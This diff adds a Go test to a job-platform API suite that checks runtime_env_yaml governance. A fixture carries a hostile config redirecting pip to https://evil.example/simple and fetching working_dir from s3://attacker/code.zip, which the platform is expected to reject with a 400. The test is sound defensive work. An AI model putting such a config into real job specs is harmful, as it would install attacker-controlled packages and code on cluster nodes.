@@ -234,3 +234,36 @@ func codeOf(r interface{ StatusCode() int }) any {
 	}
 	return r.StatusCode()
 }
+
+// runtime_env governance (issue #53): a runtime_env_yaml carrying the
+// supply-chain shapes the epic identified — an index redirect, a remote
+// working_dir fetched with node credentials — is refused at admission with
+// a 400 and no job is persisted; a governed document (pinned pip, local
+// uploads, capped setup timeout) is admitted.
+func TestJobRuntimeEnvIsGovernedAtAdmission(t *testing.T) {
+	tgt := target.Get(t)
+	req.Covers(t, 5, "a job's runtime_env_yaml is validated against the platform governance rules at admission: index redirection and remote working_dir URIs are 400 and nothing is submitted")
+	ctx := context.Background()
+
+	refused := fixture.SubmitJobBody(req.Name("evil"), "team-a", okEntrypoint, quickTTL())
+	evil := "pip:\n  packages: [torch]\n  pip_install_options: [--index-url, https://evil.example/simple]\nworking_dir: s3://attacker/code.zip"
+	refused.Spec.RuntimeEnvYaml = &evil
+	resp, err := tgt.As("dev-a").API().SubmitJobWithResponse(ctx, refused)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if resp.StatusCode() != http.StatusBadRequest {
+		t.Fatalf("submit with ungoverned runtime_env = %d %s, want 400", resp.StatusCode(), resp.Body)
+	}
+	if g, gerr := tgt.As("admin").API().GetJobWithResponse(ctx, *refused.Id); gerr != nil || g.StatusCode() != http.StatusNotFound {
+		t.Fatalf("a refused submit must persist nothing; get_job = %v", codeOf(g))
+	}
+
+	// No pip entries: the admitted document must not depend on a package
+	// install reaching an index, so the probe stays green on default-deny
+	// egress lanes.
+	legal := fixture.SubmitJobBody(req.Name("ok"), "team-a", okEntrypoint, quickTTL())
+	env := "env_vars:\n  REQ_PROBE: governed\nconfig:\n  setup_timeout_seconds: 300"
+	legal.Spec.RuntimeEnvYaml = &env
+	fixture.MustSubmitJob(t, tgt, "dev-a", legal)
+}
